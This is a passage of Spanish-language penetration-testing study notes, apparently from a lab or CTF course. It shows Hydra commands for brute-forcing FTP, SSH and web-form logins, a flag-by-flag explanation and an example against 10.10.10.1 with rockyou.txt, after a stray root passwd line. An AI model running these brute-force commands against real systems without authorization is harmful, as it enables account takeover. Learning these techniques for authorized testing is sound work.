    4. File 1 local_passwd contiene: root:x:0:0::/root:/bin/bash

    • Hydra
  • Cracking FTP
    1. usar hydra para realizar fuerza bruta en el descubrimiento de credenciales de FTP
      2. hydra -l [USER] -P [WORDLIST] ftp://[TARGET]
  • Cracking SSH
    1. usar hydra para realizar fuerza bruta en el descubrimiento de credenciales de SSH
      2. hydra -l [USER] -P [WORDLIST] [TARGET] -t 4 ssh
  • Cracking FORMS
    1. usar hydra para realizar fuerza bruta en el descubrimiento de credenciales en formularios web
      2. hydra -l [USER] -P [WORDLIST] [TARGET] http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
    2. -l: nombre del usuario
    3. -P: nombre de la lista de credenciales
    4. http-post-form: indica el tipo de formato (POST)
    5. :username: el campo del formulario donde se introduce el nombre del usuario
    6. ^USER^: le dices a Hydra que "USER" el nombre de usuario
    7. ^USER^: le dices a Hydra que "USER" el nombre de usuario
    8. password: el nombre del campo donde se introduce el password
    9. ^PASS^: le dices a Hydra que use la lista use la lista de password suministradas
    10. F=incorrect: si esta palabra aparece en la pagina es incorrecta
    11. -V: salida de informacion para cada error
    12. Ejemplo
      13. hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password are incorrect." -V
